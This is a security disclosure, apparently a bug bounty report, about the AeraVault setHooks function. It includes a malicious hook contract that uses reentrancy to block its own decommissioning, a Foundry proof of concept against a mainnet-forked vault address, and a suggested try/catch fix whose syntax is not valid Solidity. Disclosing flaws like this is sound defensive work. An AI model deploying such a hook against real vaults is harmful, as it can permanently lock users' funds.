# Malicious hook can avoid decomissioining by calling vault function with `nonReentrant` modifier.

## Bug Description

Here's malicious hook which is impossible to decommission.
```
contract MaliciousHook is Hook {
    function decommission() override external {
        vault.setHooks(address(this));
    }
}
```

As `AeraVault::setHooks()` has reentrancy protection, `hooks.decommission()` will revert.

```
    function setHooks(address newHooks)
        external
        override
        nonReentrant
        onlyOwner
        whenNotFinalized
        reserveFees
    {
        // Requirements: validate hooks address.
        _checkHooksAddress(newHooks);

        // Effects: decommission old hooks contract.
        if (address(hooks) != address(0)) {
            hooks.decommission();
        }

        // Effects: set new hooks address.
        hooks = IHooks(newHooks);

        // Log new hooks address.
        emit SetHooks(newHooks);
    }
```

## Impact
Unable to get rid of malicious hook after once being installed.

Fund might be locked permenantly because of malicious hook.

## Recommendation
`setHook` should force to decomission by wrapping with try-catch block.

```
    function setHooks(address newHooks)
        external
        override
        nonReentrant
        onlyOwner
        whenNotFinalized
        reserveFees
    {
        // Requirements: validate hooks address.
        _checkHooksAddress(newHooks);

        // Effects: decommission old hooks contract.
        if (address(hooks) != address(0)) {
-            hooks.decommission();
+            try { hooks.decommission(); } catch { } 
        }

        // Effects: set new hooks address.
        hooks = IHooks(newHooks);

        // Log new hooks address.
        emit SetHooks(newHooks);
    }
```

## Proof of Concept
```
// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity 0.8.20;

import "forge-std/Test.sol";

IVault constant vault = IVault(0x9Ecf0d8Dcc0076DD153749BECe0762aCaE1C9049);
interface IVault {
    function setHooks(address newHooks) external;
    function owner() external view returns (address);
}

struct AssetValue {
    address asset;
    uint256 value;
}

contract Hook {
    function vault() external view returns (address) { return address(vault); }
    function beforeDeposit(AssetValue[] calldata amounts) external {}
    function beforeWithdraw(AssetValue[] calldata amounts) external {}
    function decommission() virtual external {}

    function supportsInterface(bytes4 interfaceId) public view returns (bool)
    { return interfaceId == 0x01ffc9a7 || interfaceId == 0x755e7563; }
}

contract MaliciousHook is Hook {
    function decommission() override external {
        vault.setHooks(address(this));
    }
}

contract AeraTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet");
    }

    function testAera() public {

        address maliciousHook = address(new MaliciousHook());
        address normalHook = address(new Hook());

        vm.startPrank(vault.owner());
        
        console.log("Installing malicious hook...");
        vault.setHooks(maliciousHook);

        console.log("Unable to get rid of malicious hook...");
        vm.expectRevert();
        vault.setHooks(normalHook);
        
        vm.stopPrank();
    }
}

```

### Output
```
Running 1 test for test/Aera_test.sol:AeraTest
[PASS] testAera() (gas: 307492)
Logs:
  Installing malicious hook...
  Unable to get rid of malicious hook...

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 15.86s
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```